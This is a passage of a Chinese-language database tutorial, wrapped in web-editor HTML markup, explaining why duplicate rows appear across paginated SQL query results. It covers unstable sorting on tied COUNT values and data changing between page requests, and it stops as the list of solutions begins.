<span data-slate-object="text" data-key="1513"><span data-slate-leaf="true" data-offset-key="1513:0" 
data-first-offset="true"><span data-slate-string="true">下面我们再看一个分页的常见问题——不同页之间的重复数据。</span></span></span> 
</div> <div class="se-7419377e " data-slate-type="paragraph" data-slate-object="block" data-key="1514"> 
<span data-slate-object="text" data-key="1515"><span data-slate-leaf="true" data-offset-key="1515:0" 
data-first-offset="true"><span data-slate-string="true">这个问题指的是，某一条数据，在查询某一个接口第一页的时候，就返回了；可是查询第二页的时候，又返回了。</span></span></span> 
</div> <div class="se-6ac40146 " data-slate-type="paragraph" data-slate-object="block" data-key="1516"> 
<span data-slate-object="text" data-key="1517"><span data-slate-leaf="true" data-offset-key="1517:0" 
data-first-offset="true"><span data-slate-string="true">我来举个例子：</span></span></span> </div> 
<div class="se-f449ad4e se-c4c48ed2" data-slate-type="pre" data-slate-object="block" data-key="1518" 
data-code-language="sql"> <div class="se-68b31f5c se-369db0d6"> <span></span> </div> <div class="se-2427ba70"> 
<div class="se-80a95c72 se-d6177208" data-code-line-number="1"></div> </div> <div class="se-789aaab1 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1519"> <span data-slate-object="text" data-key="1520"><span data-slate-leaf="true" 
data-offset-key="1520:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4127370029" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0712963281" data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1520:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9541182912" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8952381658" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1520:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4415804746" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4245698319" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2171641900" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6652527605" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1743352166" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1520:18"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9164374457" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:19"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1520:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4799061151" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1520:21"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 266px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-e5f8bc0f " data-slate-type="paragraph" data-slate-object="block" 
data-key="1521"> <span data-slate-object="text" data-key="1522"><span data-slate-leaf="true" 
data-offset-key="1522:0" data-first-offset="true"><span data-slate-string="true">这个查询是要根据产品的数量倒序排序，然后列出第一页（前 
50 条）来。</span></span></span> </div> <div class="se-4c291353 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1523"> <span data-slate-object="text" data-key="1524"><span data-slate-leaf="true" 
data-offset-key="1524:0" data-first-offset="true"><span data-slate-string="true">接着查询第二页：</span></span></span> 
</div> <div class="se-9ee09502 se-82b368bb" data-slate-type="pre" data-slate-object="block" 
data-key="1525" data-code-language="sql"> <div class="se-6d8c6451 se-79bc0ecd"> <span></span> 
</div> <div class="se-9a223126"> <div class="se-6a83efba se-3480ae8a" data-code-line-number="1"></div> 
</div> <div class="se-102c4c87 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1526"> <span data-slate-object="text" data-key="1527"><span 
data-slate-leaf="true" data-offset-key="1527:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5321719621" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1527:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1527:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_3821435644" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1527:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3125616946" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6695609264" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1527:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2622772773" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5770940825" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9081059009" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:13"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8575200463" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2740997921" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1527:18"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4861688569" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:19"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1527:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7430304929" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1527:21"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 262px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-bb41fe2d " data-slate-type="paragraph" data-slate-object="block" 
data-key="1528"> <span data-slate-object="text" data-key="1529"><span data-slate-leaf="true" 
data-offset-key="1529:0" data-first-offset="true"><span data-slate-string="true">结果发现有某一个产品数据，同时出现在第一页和第二页上。按理说，这是不应当发生的，这条数据要么在第一页，要么在第二页，怎么能同时在第一页和第二页上呢？</span></span></span> 
</div> <div class="se-7db7c736 " data-slate-type="paragraph" data-slate-object="block" data-key="1530"> 
<span data-slate-object="text" data-key="1531"><span data-slate-leaf="true" data-offset-key="1531:0" 
data-first-offset="true"><span data-slate-string="true">其实，这只是问题现象，而其中的原因是不确定的，比如说有这样两种可能。</span></span></span> 
</div> <h3 class="se-c3f3e2b5" data-slate-type="heading" data-slate-object="block" data-key="1532"><span 
data-slate-object="text" data-key="1533"><span data-slate-leaf="true" data-offset-key="1533:0" 
data-first-offset="true"><span data-slate-string="true">排序不稳定</span></span></span></h3> <div 
class="se-162ad52e " data-slate-type="paragraph" data-slate-object="block" data-key="1534"> 
<span data-slate-object="text" data-key="1535"><span data-slate-leaf="true" data-offset-key="1535:0" 
data-first-offset="true"><span data-slate-string="true">第一种是因为查询的结果排序不稳定。</span></span></span> 
</div> <div class="se-1c6ed650 " data-slate-type="paragraph" data-slate-object="block" data-key="1536"> 
<span data-slate-object="text" data-key="1537"><span data-slate-leaf="true" data-offset-key="1537:0" 
data-first-offset="true"><span data-slate-string="true">说到这个“不稳定”，其实本质上就是排序算法的“不稳定”。如果对算法中的排序算法比较熟悉的话，你应该知道，</span></span></span><span 
data-slate-object="text" data-key="1538"><span data-slate-leaf="true" data-offset-key="1538:0" 
data-first-offset="true"><span class="se-9f59446a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">我们说排序算法稳不稳定，说的是当两个元素对排序来说“相等”的时候，是不是能够维持次序和排序前一样。</span></span></span></span><span 
data-slate-object="text" data-key="1539"><span data-slate-leaf="true" data-offset-key="1539:0" 
data-first-offset="true"><span data-slate-string="true">比如有这样一组数：</span></span></span> </div> 
<div class="se-704d2ae7 se-9834f505" data-slate-type="pre" data-slate-object="block" data-key="1540"> 
<div class="se-d5353a27 se-7884b981"> <span></span> </div> <div class="se-9008a5e4"> <div class="se-a7343691 
se-a31257a2" data-code-line-number="1"></div> </div> <div class="se-026ea238 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1541"> <span data-slate-object="text" 
data-key="1542"><span data-slate-leaf="true" data-offset-key="1542:0" data-first-offset="true"><span 
data-slate-string="true">1, 2a, 5, 2b, 3</span></span></span> </div> <div class="ps__rail-x" 
style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <div class="se-2747090c 
" data-slate-type="paragraph" data-slate-object="block" data-key="1543"> <span data-slate-object="text" 
data-key="1544"><span data-slate-leaf="true" data-offset-key="1544:0" data-first-offset="true"><span 
data-slate-string="true">这里面有两个 2，但是为了区分，其中一个叫做 2a，另一个叫做 2b。现在 2a 在 2b 前面，如果排序以后，2a 还是能够保证排在 
2b 前面，那么这个排序就是稳定的，反之则是不稳定的。有很多排序是稳定的，比如冒泡排序、插入排序，还有归并排序；但也有很多是不稳定的，比如希尔排序、快排和堆排序。</span></span></span> 
</div> <div class="se-3aa88620 " data-slate-type="paragraph" data-slate-object="block" data-key="1545"> 
<span data-slate-object="text" data-key="1546"><span data-slate-leaf="true" data-offset-key="1546:0" 
data-first-offset="true"><span data-slate-string="true">再回到我们的问题上，分页查询是根据 COUNT 来排序的，如果多条数据，它们的 
COUNT 一样，而在某些数据库（包括某些特定版本）下，查询的排序是不稳定的。这样就可能出现，这个相同 COUNT 的产品记录，在结果集中出现的顺序不一致的问题，那也就可能出现某条记录在第一页的查询中出现过了，而在第二页的查询中又出现了一遍。</span></span></span> 
</div> <div class="se-e73df6b2 " data-slate-type="paragraph" data-slate-object="block" data-key="1547"> 
<span data-slate-object="text" data-key="1548"><span data-slate-leaf="true" data-offset-key="1548:0" 
data-first-offset="true"><span data-slate-string="true">其实，从数据库的角度来说，在我们根据上述代码要求数据库返回数据的时候，COUNT 
相同的情况下，可并没有要求数据库一定要严格遵循某一个顺序啊，因此严格说起来，数据库这么做本身也是没有什么不对的。</span></span></span> </div> <div class="se-43bd6167 
" data-slate-type="paragraph" data-slate-object="block" data-key="1549"> <span data-slate-object="text" 
data-key="1550"><span data-slate-leaf="true" data-offset-key="1550:0" data-first-offset="true"><span 
data-slate-string="true">无论如何，问题如果明确是这一个，那么解决方法就比较清楚了。既然问题只会在 COUNT 相同的时候出现，那么上例中，我们给 order 
by 增加一个次要条件——ID，而因为 ID 是表的主键，不可能出现重复，因此在 COUNT 相同的时候排序一定是严格按照 ID 来递减的，这样也就可以保证排序不会因为“不稳定”而造成问题：</span></span></span> 
</div> <div class="se-59d6b96e se-fa39a68e" data-slate-type="pre" data-slate-object="block" 
data-key="1551" data-code-language="sql"> <div class="se-a0fc6e9c se-ef6155d8"> <span></span> 
</div> <div class="se-77804545"> <div class="se-8713e4cc se-bbb0c8a7" data-code-line-number="1"></div> 
</div> <div class="se-f4b6266f ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1552"> <span data-slate-object="text" data-key="1553"><span 
data-slate-leaf="true" data-offset-key="1553:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8847830714" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1553:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1553:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8773396568" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7703644019" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3305484724" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1553:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0113656430" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8168955878" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3079922797" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8713655647" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9726319729" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0917313093" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1553:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_9874565468" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1553:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_7660544090" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1553:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h3 class="se-addfca21" data-slate-type="heading" data-slate-object="block" 
data-key="1554"><span data-slate-object="text" data-key="1555"><span data-slate-leaf="true" 
data-offset-key="1555:0" data-first-offset="true"><span data-slate-string="true">数据本身变化</span></span></span></h3> 
<div class="se-291fd062 " data-slate-type="paragraph" data-slate-object="block" data-key="1556"> 
<span data-slate-object="text" data-key="1557"><span data-slate-leaf="true" data-offset-key="1557:0" 
data-first-offset="true"><span data-slate-string="true">第二个造成重复数据问题的原因是数据本身的变化。</span></span></span> 
</div> <div class="se-506760c2 " data-slate-type="paragraph" data-slate-object="block" data-key="1558"> 
<span data-slate-object="text" data-key="1559"><span data-slate-leaf="true" data-offset-key="1559:0" 
data-first-offset="true"><span data-slate-string="true">这个也不难理解，比如还是上面这行 SQL：</span></span></span> 
</div> <div class="se-5031919a se-dd8b0a4b" data-slate-type="pre" data-slate-object="block" 
data-key="1560" data-code-language="sql"> <div class="se-3cd4d8cd se-ab70bd73"> <span></span> 
</div> <div class="se-acb19242"> <div class="se-91ddd6a4 se-d933fb75" data-code-line-number="1"></div> 
</div> <div class="se-b7ef82b3 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1561"> <span data-slate-object="text" data-key="1562"><span 
data-slate-leaf="true" data-offset-key="1562:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1545224953" data-annotation-type="annotation"><span 
data-slate-string="true">select</span></span></span><span data-slate-leaf="true" data-offset-key="1562:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1562:2"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2774702198" 
data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8498764925" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2623575424" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1562:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9809265575" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4493941389" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1025687921" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7183837999" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0282939120" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1426332100" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1562:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_3336571790" data-annotation-type="annotation"><span data-slate-string="true">0</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1562:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1385526577" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1562:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 251px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-04e22763 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1563"> <span data-slate-object="text" data-key="1564"><span data-slate-leaf="true" 
data-offset-key="1564:0" data-first-offset="true"><span data-slate-string="true">本来有一行数据是在第二页的开头，用户在上述查询执行后，这行数据突然发生了变化，COUNT 
增加了不少，于是挤到第一页去了，那么相应地，第一页的最后一条数据就被挤到第二页了，于是这时候用户再来查询第二页的数据：</span></span></span> </div> <div 
class="se-939fe67f se-c7f0ed72" data-slate-type="pre" data-slate-object="block" data-key="1565" 
data-code-language="sql"> <div class="se-18489062 se-9455d523"> <span></span> </div> <div class="se-bc83538c"> 
<div class="se-b8b4dabd se-bf921635" data-code-line-number="1"></div> </div> <div class="se-ce7df1fa 
ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1566"> <span data-slate-object="text" data-key="1567"><span data-slate-leaf="true" 
data-offset-key="1567:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0052156816" data-annotation-type="annotation"><span data-slate-string="true">select</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5021865794" data-annotation-type="annotation"><span data-slate-string="true">NAME</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:3"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:4"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7774332410" data-annotation-type="annotation"><span data-slate-string="true">DESC</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:5"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:6"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0452245175" data-annotation-type="annotation"><span data-slate-string="true">from</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:7"><span data-slate-string="true"> PRODUCTS </span></span><span 
data-slate-leaf="true" data-offset-key="1567:8"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4044636337" data-annotation-type="annotation"><span data-slate-string="true">order</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:9"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:10"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9559188671" data-annotation-type="annotation"><span data-slate-string="true">by</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:11"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:12"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1368581736" data-annotation-type="annotation"><span data-slate-string="true">COUNT</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:13"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:14"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4734668102" data-annotation-type="annotation"><span data-slate-string="true">ID</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:15"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:16"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6324954984" data-annotation-type="annotation"><span data-slate-string="true">desc</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:17"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:18"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0961293986" data-annotation-type="annotation"><span data-slate-string="true">limit</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:19"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1567:20"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_5894025429" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:21"><span data-slate-string="true">, </span></span><span 
data-slate-leaf="true" data-offset-key="1567:22"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_6017229672" data-annotation-type="annotation"><span data-slate-string="true">50</span></span></span><span 
data-slate-leaf="true" data-offset-key="1567:23"><span data-slate-string="true">;</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 247px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-5b5b743c " data-slate-type="paragraph" data-slate-object="block" 
data-key="1568"> <span data-slate-object="text" data-key="1569"><span data-slate-leaf="true" 
data-offset-key="1569:0" data-first-offset="true"><span data-slate-string="true">这就发现原来第一页尾部的一条数据，又出现在了第二页的开头。</span></span></span> 
</div> <div class="se-709ec3ba " data-slate-type="paragraph" data-slate-object="block" data-key="1570"> 
<span data-slate-object="text" data-key="1571"><span data-slate-leaf="true" data-offset-key="1571:0" 
data-first-offset="true"><span data-slate-string="true">对于这个问题，我们也来看看有哪些解决方案。但是在看解决方案之前，我们先要明确，这是不是一个非得解决的问题。换言之，如果产品经理和程序员都觉得重复数据并不是什么大不了的事情，这个问题就可以放一放，我们不需要去解决那些“可以不是问题”（或者说优先极低）的问题。我知道很多人觉得这个太过浅显，甚至不值得讨论，但毕竟这是一个很基本的原则，做技术的我们在面对问题的时候始终需要明确，而不是一头扎进解决问题的泥塘里出不来了。</span></span></span> 
</div> <div class="se-86eb85a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1572"> 
<span data-slate-object="text" data-key="1573"><span data-slate-leaf="true" data-offset-key="1573:0" 
data-first-offset="true"><span data-slate-string="true">至于解决方案，比较常见的包括这样几个：</span></span></span> 
</div> <div class="se-bce3da3a " data-slate-type="paragraph" data-slate-object="block" data-key="1574"> 
